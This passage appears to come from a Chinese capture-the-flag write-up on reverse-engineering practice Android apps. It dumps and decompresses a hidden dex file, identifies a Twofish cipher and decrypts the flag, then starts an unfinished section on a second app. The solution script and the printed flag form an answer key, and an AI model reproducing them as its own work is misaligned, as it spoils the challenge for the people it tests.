v21 = open(filename, 577, 511);            if ( !v21 )              _android_log_print(5, &quot;FindMyDex&quot;, &quot;Something wrong with the permission.&quot;);            write(v21, dest, destLen);            close(v21);            free(dest);            free(data);            if ( access(name, 0) &amp;&amp; mkdir(name, 0x1FFu) )              _android_log_print(5, &quot;FindMyDex&quot;, &quot;Something wrong with the permission..&quot;);            sub_2368((int)v1);            remove(filename);            _android_log_print(4, &quot;FindMyDex&quot;, &quot;Congratulations!! You made it!&quot;);            sub_2250(v1);            v10 = 0x80000000;            v6 = v20;          }        }      }    }...</code></pre><p>用 IDC 脚本把数据 dump 下来：</p><pre><code class="cpp">static main() {    auto fp, start, end, len, b;    fp = fopen(&quot;dump.data&quot;, &quot;wb&quot;);    start = 0x7004;    len = 0x3CA10;    end = start + len;    for (b = start; b &lt; end; b++) {        fputc(Byte(b), fp);    }}</code></pre><p>然后实现一下对 dex 文件的解压缩过程：</p><pre><code class="python">#!/usr/bin/env pythonimport zlibwith open(&#39;dump.data&#39;, &#39;rb&#39;) as f:    data = f.read()data = [ord(c) for c in data]size = 0x3CA10for times in range(90):    v15 = times / 10    if times % 10 == 9:        v16 = size        v17 = size / 10        v18 = (v15 + 1) * (size / 10)        if size / 10 * v15 &lt; v18:            for i in range(v17):                data[v17 * v15 + i] ^= times        if times == 89:            while v18 - v16 &lt; 0:                data[v18] ^= 0x59                v18 += 1data = &#39;&#39;.join([chr(c) for c in data])data = zlib.decompress(data)with open(&#39;dump.dex&#39;, &#39;wb&#39;) as f:    for c in data:        f.write(c)</code></pre><p>接下来用 JEB 对 dex 文件进行分析。首先在 MainActivity 中，变量 m 是密文，onCreate 中调用了 a 类。函数 b 则是一个加密函数，其中涉及到了 b 类中函数：</p><pre><code class="java">package com.a.sample.findmydex;import android.content.Context;import android.os.Bundle;import android.support.v7.a.u;import java.io.BufferedInputStream;import java.io.ByteArrayInputStream;import java.nio.ByteBuffer;import java.util.ArrayList;public class MainActivity extends u {    private static byte[] m;    static {        MainActivity.m = new byte[]{-120, 77, -14, -38, 17, 5, -42, 44, -32, 109, 85, 0x1F, 24, -91, -112, -83, 0x40, -83, -128, 84, 5, -94, -98, -30, 18, 70, -26, 71, 5, -99, -62, -58, 0x75, 29, -44, 6, 0x70, -4, 81, 84, 9, 22, -51, 0x5F, -34, 12, 0x2F, 77};    }    public MainActivity() {        super();    }    static byte[] a(String arg1, String arg2) {        return MainActivity.b(arg1, arg2);    }    private static byte[] b(String arg7, String arg8) {        byte[] v0_1;        try {            BufferedInputStream v2 = new BufferedInputStream(new ByteArrayInputStream(arg7.getBytes()));            byte[] v1 = new byte[16];            ArrayList v3 = new ArrayList();            Object v4 = b.a(arg8.getBytes()); // 处理密钥            while(v2.read(v1, 0, 16) != -1) { // 循环加密，采用ECB模式                v3.add(b.a(v1, 0, v4));                v1 = new byte[16];            }            ByteBuffer v2_1 = ByteBuffer.allocate(v3.size() * 16); // 转换成字节数组            Object[] v3_1 = v3.toArray();            int v4_1 = v3_1.length;            int v1_1;            for(v1_1 = 0; v1_1 &lt; v4_1; ++v1_1) {                v2_1.put(v3_1[v1_1]);            }            v0_1 = v2_1.array();        }        catch(Exception v0) {            v0_1 = new byte[1];        }        return v0_1;    }    static byte[] i() { // Cipheretxt        return MainActivity.m;    }    protected void onCreate(Bundle arg4) {        super.onCreate(arg4);        this.setContentView(0x7F04001A); // activity_main        this.findViewById(0x7F0B0055).setOnClickListener(new a(this, this.findViewById(0x7F0B0054), ((Context)this))); // button | edit_text    }}</code></pre><p>类 a 中设置了一个监听按钮的事件，并将输入和指定的字符串作为参数传入 MainActivity 的函数 a。并与密文进行比较：</p><pre><code class="java">package com.a.sample.findmydex;import android.content.Context;import android.view.View$OnClickListener;import android.view.View;import android.widget.EditText;import android.widget.Toast;import java.util.Arrays;class a implements View$OnClickListener {    a(MainActivity arg1, EditText arg2, Context arg3) {        this.c = arg1;        this.a = arg2;        this.b = arg3;        super();    }    public void onClick(View arg5) {        if(Arrays.equals(MainActivity.a(this.a.getText().toString(), this.c.getString(0x7F060023)), MainActivity.i())) { // I have a male fish and a female fish.            Toast.makeText(this.b, this.c.getString(0x7F060025), 1).show(); // Yes! You got me! :)        }        else {            Toast.makeText(this.b, this.c.getString(0x7F060022), 1).show(); // NO~ You don&#39;t get me~ T_T        }    }}</code></pre><p>b 类的 a 函数主要将数组的长度补齐成 8 的倍数，并调用 b 函数：</p><pre><code class="java">    public static Object a(byte[] arg5) { // 补齐块        Object v0_3;        int v1 = 0x20;        int v0 = 0;        Class v2 = b.class;        __monitor_enter(v2);        try {            if(arg5.length &gt; v1 || arg5.length % 8 != 0) { // 长度大于32或不是8的倍数                if(arg5.length &lt;= v1) {                    v1 = arg5.length;                }                if((v1 &amp; 7) &gt; 0) { // 判断数组长度是否是8的倍数，不是的话补齐                    v0 = 1;                }                byte[] v0_2 = new byte[v0 * 8 + v1];                System.arraycopy(arg5, 0, v0_2, 0, v1);                arg5 = v0_2;            }            v0_3 = b.b(arg5);        }        catch(Throwable v0_1) {            __monitor_exit(v2);            throw v0_1;        }        __monitor_exit(v2);        return v0_3;    }</code></pre><p>b 类中的 b 函数是一个处理密钥的函数：</p><pre><code class="java">    private static Object b(byte[] arg19) { // 处理密钥        Object[] v1_2;        int[] v13;        int v10_1;        int v9_1;        int v8_1;        int[] v11_1;        int v12;        int v3;        int v1_1;        int v5;        int v4;        Class v6 = b.class;        __monitor_enter(v6);        if(arg19 != null) {            goto label_10;        }        try {            throw new InvalidKeyException(&quot;Empty key&quot;);        label_10:            v4 = arg19.length;            if(v4 != 8 &amp;&amp; v4 != 16 &amp;&amp; v4 != 24 &amp;&amp; v4 != 0x20) {                throw new InvalidKeyException(&quot;Incorrect key length&quot;);            }            int v7 = v4 / 8;            v5 = 40;            int[] v8 = new int[4];            int[] v9 = new int[4];            int[] v10 = new int[4];            v1_1 = 0;            v3 = 0;            int v2;            for(v2 = v7 - 1; v3 &lt; 4; --v2) {                if(v1_1 &gt;= v4) {                    break;                }                int v11 = v1_1 + 1;                v12 = v11 + 1;                v1_1 = arg19[v1_1] &amp; 0xFF | (arg19[v11] &amp; 0xFF) &lt;&lt; 8;                v11 = v12 + 1;                v1_1 |= (arg19[v12] &amp; 0xFF) &lt;&lt; 16;                v12 = v11 + 1;                v8[v3] = v1_1 | (arg19[v11] &amp; 0xFF) &lt;&lt; 24;                v1_1 = v12 + 1;                v11 = arg19[v12] &amp; 0xFF;                v12 = v1_1 + 1;                v1_1 = (arg19[v1_1] &amp; 0xFF) &lt;&lt; 8 | v11;                v11 = v12 + 1;                v12 = (arg19[v12] &amp; 0xFF) &lt;&lt; 16 | v1_1;                v1_1 = v11 + 1;                v9[v3] = (arg19[v11] &amp; 0xFF) &lt;&lt; 24 | v12;                v10[v2] = b.a(v8[v3], v9[v3]);                ++v3;            }            v11_1 = new int[v5];            v1_1 = 0;            v2 = 0;            while(v2 &lt; 20) {                v3 = b.a(v7, v1_1, v8);                v4 = b.a(v7, 0x1010101 + v1_1, v9);                v4 = v4 &gt;&gt;&gt; 24 | v4 &lt;&lt; 8;                v3 += v4;                v11_1[v2 * 2] = v3;                v3 += v4;                v11_1[v2 * 2 + 1] = v3 &gt;&gt;&gt; 23 | v3 &lt;&lt; 9;                ++v2;                v1_1 += 0x2020202;            }            v8_1 = v10[0];            v9_1 = v10[1];            v12 = v10[2];            v10_1 = v10[3];            v13 = new int[0x400];            v2 = 0;            while(true) {            label_120:                if(v2 &gt;= 0x100) {                    goto label_324;                }                switch(v7 &amp; 3) {                    case 0: {                        goto label_183;                    }                    case 1: {                        goto label_126;                    }                    case 2: {                        goto label_332;                    }                    case 3: {                        goto label_337;                    }                }                goto label_124;            }        }        catch(Throwable v1) {            goto label_8;        }    label_337:        v1_1 = v2;        v3 = v2;        v4 = v2;        v5 = v2;        goto label_211;        try {        label_183:            v5 = b.a[1][v2] &amp; 0xFF ^ b.e(v10_1);            v4 = b.a[0][v2] &amp; 0xFF ^ b.f(v10_1);            v3 = b.g(v10_1) ^ b.a[0][v2] &amp; 0xFF;            v1_1 = b.a[1][v2] &amp; 0xFF ^ b.h(v10_1);        label_211:            v5 = b.a[1][v5] &amp; 0xFF ^ b.e(v12);            v4 = b.a[1][v4] &amp; 0xFF ^ b.f(v12);            v3 = b.a[0][v3] &amp; 0xFF ^ b.g(v12);            v1_1 = b.a[0][v1_1] &amp; 0xFF ^ b.h(v12);            goto label_239;        }        catch(Throwable v1) {            goto label_8;        }    label_332:        v1_1 = v2;        v3 = v2;        v4 = v2;        v5 = v2;        try {        label_239:            v13[v2 * 2] = b.b[0][b.a[0][b.a[0][v5] &amp; 0xFF ^ b.e(v9_1)] &amp; 0xFF ^ b.e(v8_1)];            v13[v2 * 2 + 1] = b.b[1][b.a[0][b.a[1][v4] &amp; 0xFF ^ b.f(v9_1)] &amp; 0xFF ^ b.f(v8_1)];            v13[v2 * 2 + 0x200] = b.b[2][b.a[1][b.a[0][v3] &amp; 0xFF ^ b.g(v9_1)] &amp; 0xFF ^ b.g(v8_1)];            v13[v2 * 2 + 0x201] = b.b[3][b.a[1][b.a[1][v1_1] &amp; 0xFF ^ b.h(v9_1)] &amp; 0xFF ^ b.h(v8_1)];            goto label_124;        label_126:            v13[v2 * 2] = b.b[0][b.a[0][v2] &amp; 0xFF ^ b.e(v8_1)];            v13[v2 * 2 + 1] = b.b[1][b.a[0][v2] &amp; 0xFF ^ b.f(v8_1)];            v13[v2 * 2 + 0x200] = b.b[2][b.a[1][v2] &amp; 0xFF ^ b.g(v8_1)];            v13[v2 * 2 + 0x201] = b.b[3][b.a[1][v2] &amp; 0xFF ^ b.h(v8_1)];        label_124:            ++v2;            goto label_120;        label_324:            v1_2 = new Object[]{v13, v11_1};        }        catch(Throwable v1) {            goto label_8;        }        __monitor_exit(v6);        return v1_2;    label_8:        __monitor_exit(v6);        throw v1;    }</code></pre><p>这个 a 函数判断传入的字节数组、、密钥都不为空，并调用 b 函数：</p><pre><code class="java">    public static byte[] a(byte[] arg1, int arg2, Object arg3) {        byte[] v0 = arg1 == null || arg3 == null || arg2 &lt; 0 ? null : b.b(arg1, arg2, arg3);        return v0;    }</code></pre><p>b 函数应该就是对数据的加密过程，明显是个 16 次轮函数的分组密码：</p><pre><code class="java">    private static byte[] b(byte[] arg12, int arg13, Object arg14) {        int[] v0 = arg14[0];        Object v1 = arg14[1];        int v2 = arg13 + 1;        int v4 = v2 + 1;        int v3 = v4 + 1;        v2 = (arg12[v2] &amp; 0xFF) &lt;&lt; 8 | arg12[arg13] &amp; 0xFF | (arg12[v4] &amp; 0xFF) &lt;&lt; 16;        v4 = v3 + 1;        v2 |= (arg12[v3] &amp; 0xFF) &lt;&lt; 24;        v3 = v4 + 1;        int v5 = v3 + 1;        v3 = (arg12[v3] &amp; 0xFF) &lt;&lt; 8 | arg12[v4] &amp; 0xFF;        v4 = v5 + 1;        v3 |= (arg12[v5] &amp; 0xFF) &lt;&lt; 16;        v5 = v4 + 1;        v3 |= (arg12[v4] &amp; 0xFF) &lt;&lt; 24;        v4 = v5 + 1;        int v6 = v4 + 1;        v4 = (arg12[v4] &amp; 0xFF) &lt;&lt; 8 | arg12[v5] &amp; 0xFF;        v5 = v6 + 1;        v4 |= (arg12[v6] &amp; 0xFF) &lt;&lt; 16;        v6 = v5 + 1;        v4 |= (arg12[v5] &amp; 0xFF) &lt;&lt; 24;        v5 = v6 + 1;        int v7 = v5 + 1;        int v8 = (arg12[v5] &amp; 0xFF) &lt;&lt; 8 | arg12[v6] &amp; 0xFF | (arg12[v7] &amp; 0xFF) &lt;&lt; 16 | (arg12[v7 + 1] &amp; 0xFF) &lt;&lt; 24;        v7 = v2 ^ v1[0];        v6 = v3 ^ v1[1];        v5 = v4 ^ v1[2];        v4 = v8 ^ v1[3];        v3 = 8;        for(v2 = 0; v2 &lt; 16; v2 += 2) {            v8 = b.a(v0, v7, 0);            int v9 = b.a(v0, v6, 3);            int v11 = v3 + 1;            v3 = v1[v3] + (v8 + v9) ^ v5;            v5 = v3 &gt;&gt;&gt; 1 | v3 &lt;&lt; 0x1F;            v3 = v4 &lt;&lt; 1 | v4 &gt;&gt;&gt; 0x1F;            v4 = v9 * 2 + v8;            v8 = v11 + 1;            v4 = v4 + v1[v11] ^ v3;            v3 = b.a(v0, v5, 0);            v9 = b.a(v0, v4, 3);            v11 = v8 + 1;            v7 ^= v1[v8] + (v3 + v9);            v7 = v7 &lt;&lt; 0x1F | v7 &gt;&gt;&gt; 1;            v8 = v9 * 2 + v3;            v3 = v11 + 1;            v6 = (v6 &gt;&gt;&gt; 0x1F | v6 &lt;&lt; 1) ^ v8 + v1[v11];        }        int v0_1 = v1[4] ^ v5;        v2 = v1[5] ^ v4;        v3 = v1[6] ^ v7;        int v1_1 = v1[7] ^ v6;        return new byte[]{((byte)v0_1), ((byte)(v0_1 &gt;&gt;&gt; 8)), ((byte)(v0_1 &gt;&gt;&gt; 16)), ((byte)(v0_1 &gt;&gt;&gt; 24)), ((byte)v2), ((byte)(v2 &gt;&gt;&gt; 8)), ((byte)(v2 &gt;&gt;&gt; 16)), ((byte)(v2 &gt;&gt;&gt; 24)), ((byte)v3), ((byte)(v3 &gt;&gt;&gt; 8)), ((byte)(v3 &gt;&gt;&gt; 16)), ((byte)(v3 &gt;&gt;&gt; 24)), ((byte)v1_1), ((byte)(v1_1 &gt;&gt;&gt; 8)), ((byte)(v1_1 &gt;&gt;&gt; 16)), ((byte)(v1_1 &gt;&gt;&gt; 24))};    }</code></pre><p>分组密码可以去找一下特征，看到了 b 类的头上定义了两个数据，转成 16 进制之后拿去搜一下：</p><pre><code class="java">        v0[0] = new byte[]{-87, 103, -77, -24, 4, -3, -93, 0x76, -102, -110, -128, 120, -28, -35, -47, 56, 13, -58, 53, -104, 24, -9, -20, 108, 67, 0x75, 55, 38, -6, 19, -108, 72, -14, -48, -117, 0x30, -124, 84, -33, 35, 25, 91, 61, 89, -13, -82, -94, -126, 99, 1, -125, 46, -39, 81, -101, 0x7C, -90, -21, -91, -66, 22, 12, -29, 97, -64, -116, 58, -11, 0x73, 44, 37, 11, -69, 78, -119, 107, 83, 106, -76, -15, -31, -26, -67, 69, -30, -12, -74, 102, -52, -107, 3, 86, -44, 28, 30, -41, -5, -61, -114, -75, -23, -49, -65, -70, -22, 0x77, 57, -81, 51, -55, 98, 0x71, -127, 0x79, 9, -83, 36, -51, -7, -40, -27, -59, -71, 77, 68, 8, -122, -25, -95, 29, -86, -19, 6, 0x70, -78, -46, 65, 0x7B, -96, 17, 49, -62, 39, -112, 0x20, -10, 0x60, -1, -106, 92, -79, -85, -98, -100, 82, 27, 0x5F, -109, 10, -17, -111, -123, 73, -18, 45, 0x4F, -113, 59, 71, -121, 109, 70, -42, 62, 105, 100, 42, -50, -53, 0x2F, -4, -105, 5, 0x7A, -84, 0x7F, -43, 26, 75, 14, -89, 90, 40, 20, 0x3F, 41, -120, 60, 76, 2, -72, -38, -80, 23, 85, 0x1F, -118, 0x7D, 87, -57, -115, 0x74, -73, -60, -97, 0x72, 0x7E, 21, 34, 18, 88, 7, -103, 52, 110, 80, -34, 104, 101, -68, -37, -8, -56, -88, 43, 0x40, -36, -2, 50, -92, -54, 16, 33, -16, -45, 93, 15, 0, 0x6F, -99, 54, 66, 74, 94, -63, -32}; // 0xA9, 0x67, 0xB3, 0xE8, 0x04, 0xFD, 0xA3, 0x76, 0x9A, 0x92, 0x80, 0x78, 0xE4, 0xDD, 0xD1, 0x38, 0x0D, 0xC6, 0x35, 0x98, 0x18, 0xF7, 0xEC, 0x6C, 0x43, 0x75, 0x37, 0x26, 0xFA, 0x13, 0x94, 0x48, 0xF2, 0xD0, 0x8B, 0x30, 0x84, 0x54, 0xDF, 0x23, 0x19, 0x5B, 0x3D, 0x59, 0xF3, 0xAE, 0xA2, 0x82, 0x63, 0x01, 0x83, 0x2E, 0xD9, 0x51, 0x9B, 0x7C, 0xA6, 0xEB, 0xA5, 0xBE, 0x16, 0x0C, 0xE3, 0x61, 0xC0, 0x8C, 0x3A, 0xF5, 0x73, 0x2C, 0x25, 0x0B, 0xBB, 0x4E, 0x89, 0x6B, 0x53, 0x6A, 0xB4, 0xF1, 0xE1, 0xE6, 0xBD, 0x45, 0xE2, 0xF4, 0xB6, 0x66, 0xCC, 0x95, 0x03, 0x56, 0xD4, 0x1C, 0x1E, 0xD7, 0xFB, 0xC3, 0x8E, 0xB5, 0xE9, 0xCF, 0xBF, 0xBA, 0xEA, 0x77, 0x39, 0xAF, 0x33, 0xC9, 0x62, 0x71, 0x81, 0x79, 0x09, 0xAD, 0x24, 0xCD, 0xF9, 0xD8, 0xE5, 0xC5, 0xB9, 0x4D, 0x44, 0x08, 0x86, 0xE7, 0xA1, 0x1D, 0xAA, 0xED, 0x06, 0x70, 0xB2, 0xD2, 0x41, 0x7B, 0xA0, 0x11, 0x31, 0xC2, 0x27, 0x90, 0x20, 0xF6, 0x60, 0xFF, 0x96, 0x5C, 0xB1, 0xAB, 0x9E, 0x9C, 0x52, 0x1B, 0x5F, 0x93, 0x0A, 0xEF, 0x91, 0x85, 0x49, 0xEE, 0x2D, 0x4F, 0x8F, 0x3B, 0x47, 0x87, 0x6D, 0x46, 0xD6, 0x3E, 0x69, 0x64, 0x2A, 0xCE, 0xCB, 0x2F, 0xFC, 0x97, 0x05, 0x7A, 0xAC, 0x7F, 0xD5, 0x1A, 0x4B, 0x0E, 0xA7, 0x5A, 0x28, 0x14, 0x3F, 0x29, 0x88, 0x3C, 0x4C, 0x02, 0xB8, 0xDA, 0xB0, 0x17, 0x55, 0x1F, 0x8A, 0x7D, 0x57, 0xC7, 0x8D, 0x74, 0xB7, 0xC4, 0x9F, 0x72, 0x7E, 0x15, 0x22, 0x12, 0x58, 0x07, 0x99, 0x34, 0x6E, 0x50, 0xDE, 0x68, 0x65, 0xBC, 0xDB, 0xF8, 0xC8, 0xA8, 0x2B, 0x40, 0xDC, 0xFE, 0x32, 0xA4, 0xCA, 0x10, 0x21, 0xF0, 0xD3, 0x5D, 0x0F, 0x00, 0x6F, 0x9D, 0x36, 0x42, 0x4A, 0x5E, 0xC1, 0xE0        v0[1] = new byte[]{0x75, -13, -58, -12, -37, 0x7B, -5, -56, 74, -45, -26, 107, 69, 0x7D, -24, 75, -42, 50, -40, -3, 55, 0x71, -15, -31, 0x30, 15, -8, 27, -121, -6, 6, 0x3F, 94, -70, -82, 91, -118, 0, -68, -99, 109, -63, -79, 14, -128, 93, -46, -43, -96, -124, 7, 20, -75, -112, 44, -93, -78, 0x73, 76, 84, -110, 0x74, 54, 81, 56, -80, -67, 90, -4, 0x60, 98, -106, 108, 66, -9, 16, 0x7C, 40, 39, -116, 19, -107, -100, -57, 36, 70, 59, 0x70, -54, -29, -123, -53, 17, -48, -109, -72, -90, -125, 0x20, -1, -97, 0x77, -61, -52, 3, 0x6F, 8, -65, 0x40, -25, 43, -30, 0x79, 12, -86, -126, 65, 58, -22, -71, -28, -102, -92, -105, 0x7E, -38, 0x7A, 23, 102, -108, -95, 29, 61, -16, -34, -77, 11, 0x72, -89, 28, -17, -47, 83, 62, -113, 51, 38, 0x5F, -20, 0x76, 42, 73, -127, -120, -18, 33, -60, 26, -21, -39, -59, 57, -103, -51, -83, 49, -117, 1, 24, 35, -35, 0x1F, 78, 45, -7, 72, 0x4F, -14, 101, -114, 120, 92, 88, 25, -115, -27, -104, 87, 103, 0x7F, 5, 100, -81, 99, -74, -2, -11, -73, 60, -91, -50, -23, 104, 68, -32, 77, 67, 105, 41, 46, -84, 21, 89, -88, 10, -98, 110, 71, -33, 52, 53, 106, -49, -36, 34, -55, -64, -101, -119, -44, -19, -85, 18, -94, 13, 82, -69, 2, 0x2F, -87, -41, 97, 30, -76, 80, 4, -10, -62, 22, 37, -122, 86, 85, 9, -66, -111}; // 0x75, 0xF3, 0xC6, 0xF4, 0xDB, 0x7B, 0xFB, 0xC8, 0x4A, 0xD3, 0xE6, 0x6B, 0x45, 0x7D, 0xE8, 0x4B, 0xD6, 0x32, 0xD8, 0xFD, 0x37, 0x71, 0xF1, 0xE1, 0x30, 0x0F, 0xF8, 0x1B, 0x87, 0xFA, 0x06, 0x3F, 0x5E, 0xBA, 0xAE, 0x5B, 0x8A, 0x00, 0xBC, 0x9D, 0x6D, 0xC1, 0xB1, 0x0E, 0x80, 0x5D, 0xD2, 0xD5, 0xA0, 0x84, 0x07, 0x14, 0xB5, 0x90, 0x2C, 0xA3, 0xB2, 0x73, 0x4C, 0x54, 0x92, 0x74, 0x36, 0x51, 0x38, 0xB0, 0xBD, 0x5A, 0xFC, 0x60, 0x62, 0x96, 0x6C, 0x42, 0xF7, 0x10, 0x7C, 0x28, 0x27, 0x8C, 0x13, 0x95, 0x9C, 0xC7, 0x24, 0x46, 0x3B, 0x70, 0xCA, 0xE3, 0x85, 0xCB, 0x11, 0xD0, 0x93, 0xB8, 0xA6, 0x83, 0x20, 0xFF, 0x9F, 0x77, 0xC3, 0xCC, 0x03, 0x6F, 0x08, 0xBF, 0x40, 0xE7, 0x2B, 0xE2, 0x79, 0x0C, 0xAA, 0x82, 0x41, 0x3A, 0xEA, 0xB9, 0xE4, 0x9A, 0xA4, 0x97, 0x7E, 0xDA, 0x7A, 0x17, 0x66, 0x94, 0xA1, 0x1D, 0x3D, 0xF0, 0xDE, 0xB3, 0x0B, 0x72, 0xA7, 0x1C, 0xEF, 0xD1, 0x53, 0x3E, 0x8F, 0x33, 0x26, 0x5F, 0xEC, 0x76, 0x2A, 0x49, 0x81, 0x88, 0xEE, 0x21, 0xC4, 0x1A, 0xEB, 0xD9, 0xC5, 0x39, 0x99, 0xCD, 0xAD, 0x31, 0x8B, 0x01, 0x18, 0x23, 0xDD, 0x1F, 0x4E, 0x2D, 0xF9, 0x48, 0x4F, 0xF2, 0x65, 0x8E, 0x78, 0x5C, 0x58, 0x19, 0x8D, 0xE5, 0x98, 0x57, 0x67, 0x7F, 0x05, 0x64, 0xAF, 0x63, 0xB6, 0xFE, 0xF5, 0xB7, 0x3C, 0xA5, 0xCE, 0xE9, 0x68, 0x44, 0xE0, 0x4D, 0x43, 0x69, 0x29, 0x2E, 0xAC, 0x15, 0x59, 0xA8, 0x0A, 0x9E, 0x6E, 0x47, 0xDF, 0x34, 0x35, 0x6A, 0xCF, 0xDC, 0x22, 0xC9, 0xC0, 0x9B, 0x89, 0xD4, 0xED, 0xAB, 0x12, 0xA2, 0x0D, 0x52, 0xBB, 0x02, 0x2F, 0xA9, 0xD7, 0x61, 0x1E, 0xB4, 0x50, 0x04, 0xF6, 0xC2, 0x16, 0x25, 0x86, 0x56, 0x55, 0x09, 0xBE, 0x91</code></pre><p>发现是 twofish 算法：</p><p><img src="/pics/攻防世界-MOBILE-新手练习区/2.png" srcset="/img/loading.gif" alt></p><p>上面的一些资源可以在 Resources/values/public.xml 中找到 ID 对应的字符串名：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;resources&gt;  ...  &lt;public id=&quot;0x7f04001a&quot; name=&quot;activity_main&quot; type=&quot;layout&quot; /&gt;  ...  &lt;public id=&quot;0x7f060022&quot; name=&quot;no&quot; type=&quot;string&quot; /&gt;  &lt;public id=&quot;0x7f060023&quot; name=&quot;two_fish&quot; type=&quot;string&quot; /&gt;  ...  &lt;public id=&quot;0x7f060025&quot; name=&quot;yes&quot; type=&quot;string&quot; /&gt;  ...  &lt;public id=&quot;0x7f0b0054&quot; name=&quot;edit_text&quot; type=&quot;id&quot; /&gt;  &lt;public id=&quot;0x7f0b0055&quot; name=&quot;button&quot; type=&quot;id&quot; /&gt;  ...&lt;/resources&gt;</code></pre><p>可以在 Resources/values/strings.xml 中找到对应的字符串：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;resources&gt;  ...  &lt;string name=&quot;no&quot;&gt;    NO~ You don&#39;t get me~ T_T&lt;/string&gt;  &lt;string name=&quot;two_fish&quot;&gt;    I have a male fish and a female fish.&lt;/string&gt;  &lt;string name=&quot;what_else&quot;&gt;    What else?&lt;/string&gt;  &lt;string name=&quot;yes&quot;&gt;    Yes! You got me! :)&lt;/string&gt;&lt;/resources&gt;</code></pre><p>最后找个库实现一下解密：</p><pre><code class="python">#!/usr/bin/env pythonfrom twofish import Twofishciphertext = [0x88, 0x4D, 0xF2, 0xDA, 0x11, 0x05, 0xD6, 0x2C, 0xE0, 0x6D, 0x55, 0x1F, 0x18, 0xA5, 0x90, 0xAD, 0x40, 0xAD, 0x80, 0x54, 0x05, 0xA2, 0x9E, 0xE2, 0x12, 0x46, 0xE6, 0x47, 0x05, 0x9D, 0xC2, 0xC6, 0x75, 0x1D, 0xD4, 0x06, 0x70, 0xFC, 0x51, 0x54, 0x09, 0x16, 0xCD, 0x5F, 0xDE, 0x0C, 0x2F, 0x4D]ciphertext = &#39;&#39;.join([chr(c) for c in ciphertext])T = Twofish(&#39;I have a male fish and a female &#39;)flag = &#39;&#39;for i in range(0, 48, 16):    flag += T.decrypt(ciphertext[i:i+16])print flag# qwb{TH3y_Io&lt;e_EACh_OTh3r_FOrEUER}</code></pre><h1 id="你是谁"><a href="#你是谁" class="headerlink" title="你是谁"></a>你是谁</h1><p>TODO:</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot; package=&quot;xyz.konso.testsrtp&quot; platformBuildVersionCode=&quot;23&quot; platformBuildVersionName=&quot;6.0-2166767&quot;&gt;    &lt;uses-sdk android:minSdkVersion=&quot;15&quot; android:targetSdkVersion=&quot;23&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.RECORD_AUDIO&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.CHANGE_NETWORK_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.ACCESS_FINE_LOCATION&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.READ_CONTACTS&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.CALL_PHONE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.BROADCAST_STICKY&quot; /&gt;    注：部分手机如无此权限会报错    &lt;uses-permission android:name=&quot;android.permission.BLUETOOTH&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.MODIFY_AUDIO_SETTINGS&quot; /&gt;    &lt;application android:theme=&quot;@style/AppTheme&quot; android:label=&quot;@string/app_name&quot; android:icon=&quot;@mipmap/icon&quot; android:debuggable=&quot;true&quot; android:allowBackup=&quot;true&quot; android:supportsRtl=&quot;true&quot;&gt;        &lt;activity android:name=&quot;xyz.konso.testsrtp.MainActivity&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.view&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;        &lt;activity android:name=&quot;xyz.konso.testsrtp.SplashActivity&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;    &lt;/application&gt;&lt;/manifest&gt;</code></pre><pre><code class="java">package xyz.konso.testsrtp;import android.app.Activity;import android.content.Intent;import android.content.pm.PackageManager.NameNotFoundException;import android.os.Bundle;import android.os.Handler;import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;import android.widget.TextView;public class SplashActivity extends Activity {    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        getWindow().setFlags(AccessibilityNodeInfoCompat.ACTION_NEXT_HTML_ELEMENT, AccessibilityNodeInfoCompat.ACTION_NEXT_HTML_ELEMENT);        setContentView(R.layout.activity_splash);        try {            ((TextView) findViewById(R.id.versionNumber)).setText(&quot;Version &quot; + getPackageManager().getPackageInfo(&quot;com.lyt.android&quot;, 0).versionName);        } catch (NameNotFoundException e) {            e.printStackTrace();        }        new Handler().postDelayed(new Runnable() {            public void run() {                SplashActivity.this.startActivity(new Intent(SplashActivity.this, MainActivity.class));                SplashActivity.this.finish();            }        }, 2500);    }}</code></pre><pre><code class="java">package xyz.konso.testsrtp;import android.app.Activity;import android.media.AudioManager;import android.os.Bundle;import android.util.Log;import android.widget.Button;import android.widget.Toast;import com.iflytek.cloud.InitListener;import com.iflytek.cloud.RecognizerListener;import com.iflytek.cloud.RecognizerResult;import com.iflytek.cloud.SpeechConstant;import com.iflytek.cloud.SpeechError;import com.iflytek.cloud.SpeechRecognizer;import com.iflytek.cloud.SpeechSynthesizer;import com.iflytek.cloud.SpeechUtility;import com.iflytek.cloud.SynthesizerListener;import org.json.JSONObject;public class MainActivity extends Activity {    private String TAG = &quot;shitou&quot;;    private Button button1;    private Button button2;    private AudioManager mAudioManager;    private SpeechRecognizer mIat;    private InitListener mInitListener = new InitListener() {        public void onInit(int code) {            Log.d(MainActivity.this.TAG, &quot;SpeechRecognizer init() code = &quot; + code);        }    };    